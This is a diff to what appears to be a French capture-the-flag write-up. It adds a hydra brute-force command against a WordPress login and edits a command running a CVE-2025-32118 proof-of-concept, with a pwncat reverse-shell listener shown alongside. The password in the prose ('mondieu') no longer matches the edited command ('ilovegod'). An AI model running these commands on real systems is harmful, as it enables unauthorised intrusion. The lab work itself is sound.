@@ -200,12 +200,15 @@ Cependant on fais face à un problème, il faut des credentials pour lancer cett
     
 
 On lance alors un bruteforce sur la page de login en tant que hermes et avec la wordlist rockyou.txt et on trouve le mots de passe `mondieu` 
+```bash
+hydra -l hermes -P `fzf-wordlists` olympe.god http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Folympe.god%2Fwp-admin%2F&testcookie=1:F=Incorrect"
+```
 
 A partir de là, on peut utiliser la CVE pour obtenir un accès `www-data` sur la machine via un revershell obtenue à travers le webshell offert par le POC de la CVE.
 
 ```bash
 #POC CVE wordpress
-python3 CVE-2025-32118.py -u http://olympe.god/wordpress -un hermes -p mondieu
+python3 CVE-2025-32118.py -u http://olympe.god/wordpress -un hermes -p ilovegod
 # Ecoute sur un portattaquant
 pwncat-cs :9001
 # Envoie du payload
